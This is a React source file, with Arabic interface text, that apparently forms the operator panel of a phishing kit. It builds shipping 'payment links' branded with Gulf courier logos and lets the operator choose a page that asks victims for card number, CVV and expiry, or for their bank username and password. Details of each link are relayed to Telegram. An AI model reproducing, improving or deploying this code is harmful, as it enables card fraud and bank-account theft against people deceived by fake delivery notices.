import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Package, MapPin, DollarSign, Hash, Copy, Check, ExternalLink, CreditCard, LogIn } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";

const CreateShippingLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country || "");
  const services = getServicesByCountry(country || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("");
  const [createdLink, setCreatedLink] = useState<string | null>(null);
  const [linkType, setLinkType] = useState<"card" | "login">("card");
  const [copied, setCopied] = useState(false);
  
  // Get selected service details and branding
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );
  
  const serviceBranding = useMemo(() => 
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedService || !trackingNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }
    
    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: trackingNumber,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
        },
      });
      
      // Send data to Telegram
      const telegramResult = await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: trackingNumber,
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }

      // Generate link based on type
      const baseUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`;
      const finalLink = linkType === "login" 
        ? `${baseUrl}&type=login` 
        : baseUrl;
      
      setCreatedLink(finalLink);
      
      toast({
        title: "تم إنشاء الرابط بنجاح!",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء الرابط",
        variant: "destructive",
      });
    }
  };
  
  const handleCopy = () => {
    if (createdLink) {
      navigator.clipboard.writeText(createdLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
      toast({
        title: "تم النسخ!",
        description: "تم نسخ الرابط إلى الحافظة",
      });
    }
  };
  
  const handlePreview = () => {
    if (createdLink) {
      window.open(createdLink, "_blank");
    }
  };
  
  const handleCreateNew = () => {
    setCreatedLink(null);
    setSelectedService("");
    setTrackingNumber("");
    setPackageDescription("");
    setCodAmount("");
    setCopied(false);
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
          <p className="text-muted-foreground">الرجاء اختيار دولة صحيحة</p>
        </div>
      </div>
    );
  }
  
  // Success Screen - Show Created Link
  if (createdLink) {
    return (
      <div className="min-h-screen py-8 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            <Card className="p-6 shadow-elevated">
              {/* Success Header */}
              <div className="text-center mb-6">
                <div 
                  className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
                  }}
                >
                  <Check className="w-8 h-8 text-white" />
                </div>
                <h2 className="text-2xl font-bold mb-2">تم إنشاء الرابط بنجاح!</h2>
                <p className="text-sm text-muted-foreground">
                  شارك هذا الرابط مع عملائك
                </p>
              </div>

              {/* Link Type Badge */}
              <div className="mb-4 flex justify-center">
                <div 
                  className="inline-flex items-center gap-2 px-4 py-2 rounded-full text-sm font-semibold"
                  style={{
                    background: `linear-gradient(135deg, ${countryData.primaryColor}15, ${countryData.secondaryColor}15)`,
                    border: `2px solid ${countryData.primaryColor}`,
                    color: countryData.primaryColor
                  }}
                >
                  {linkType === "card" ? (
                    <>
                      <CreditCard className="w-4 h-4" />
                      <span>رابط بيانات البطاقة</span>
                    </>
                  ) : (
                    <>
                      <LogIn className="w-4 h-4" />
                      <span>رابط تسجيل الدخول</span>
                    </>
                  )}
                </div>
              </div>

              {/* Link Display */}
              <div className="mb-6 p-4 bg-muted/50 rounded-lg border-2 border-border">
                <Label className="text-xs text-muted-foreground mb-2 block">الرابط المُنشأ</Label>
                <code className="text-xs break-all block">{createdLink}</code>
              </div>

              {/* Action Buttons */}
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  <Button
                    onClick={handleCopy}
                    className="w-full"
                    style={{
                      background: copied 
                        ? `linear-gradient(135deg, #10b981, #059669)` 
                        : `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
                    }}
                  >
                    {copied ? (
                      <>
                        <Check className="w-4 h-4 ml-2" />
                        <span>تم النسخ</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4 ml-2" />
                        <span>نسخ الرابط</span>
                      </>
                    )}
                  </Button>

                  <Button
                    onClick={handlePreview}
                    variant="outline"
                    className="w-full"
                    style={{
                      borderColor: countryData.primaryColor,
                      color: countryData.primaryColor,
                    }}
                  >
                    <ExternalLink className="w-4 h-4 ml-2" />
                    <span>معاينة</span>
                  </Button>
                </div>

                <Button
                  onClick={handleCreateNew}
                  variant="ghost"
                  className="w-full"
                >
                  إنشاء رابط جديد
                </Button>
              </div>
            </Card>
          </div>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>
        
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection with Logo and Description */}
              <div>
                <Label className="mb-2 text-sm">خدمة الشحن *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة الشحن" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img 
                        src={serviceBranding.logo} 
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                </div>
              )}
              
              {/* Tracking Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الشحنة *
                </Label>
                <Input
                  value={trackingNumber}
                  onChange={(e) => setTrackingNumber(e.target.value)}
                  placeholder="مثال: 1234567890"
                  className="h-9 text-sm"
                  required
                />
              </div>
              
              {/* Package Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  وصف الطرد
                </Label>
                <Input
                  value={packageDescription}
                  onChange={(e) => setPackageDescription(e.target.value)}
                  placeholder="مثال: ملابس، إلكترونيات"
                  className="h-9 text-sm"
                />
              </div>
              
              {/* COD Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ الدفع عند الاستلام
                </Label>
                <Input
                  type="number"
                  value={codAmount}
                  onChange={(e) => setCodAmount(e.target.value)}
                  placeholder="0.00"
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
              </div>

              {/* Link Type Selection */}
              <div>
                <Label className="mb-3 text-sm font-semibold block">نوع الرابط *</Label>
                <RadioGroup value={linkType} onValueChange={(value) => setLinkType(value as "card" | "login")}>
                  <div className="space-y-3">
                    {/* Card Payment Option */}
                    <div 
                      className={`flex items-start gap-3 p-4 rounded-lg border-2 cursor-pointer transition-all ${
                        linkType === "card" 
                          ? "border-primary bg-primary/5" 
                          : "border-border hover:border-primary/50"
                      }`}
                      onClick={() => setLinkType("card")}
                    >
                      <RadioGroupItem value="card" id="card" className="mt-1" />
                      <div className="flex-1">
                        <Label htmlFor="card" className="cursor-pointer flex items-center gap-2 mb-1">
                          <CreditCard className="w-4 h-4" />
                          <span className="font-semibold">بيانات البطاقة</span>
                        </Label>
                        <p className="text-xs text-muted-foreground">
                          يطلب من العميل إدخال معلومات البطاقة مباشرة (رقم البطاقة، CVV، تاريخ الانتهاء)
                        </p>
                      </div>
                    </div>

                    {/* Login Option */}
                    <div 
                      className={`flex items-start gap-3 p-4 rounded-lg border-2 cursor-pointer transition-all ${
                        linkType === "login" 
                          ? "border-primary bg-primary/5" 
                          : "border-border hover:border-primary/50"
                      }`}
                      onClick={() => setLinkType("login")}
                    >
                      <RadioGroupItem value="login" id="login" className="mt-1" />
                      <div className="flex-1">
                        <Label htmlFor="login" className="cursor-pointer flex items-center gap-2 mb-1">
                          <LogIn className="w-4 h-4" />
                          <span className="font-semibold">تسجيل دخول البنك</span>
                        </Label>
                        <p className="text-xs text-muted-foreground">
                          يطلب من العميل تسجيل الدخول إلى البنك (اسم المستخدم وكلمة المرور)
                        </p>
                      </div>
                    </div>
                  </div>
                </RadioGroup>
              </div>
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Package className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default CreateShippingLink;
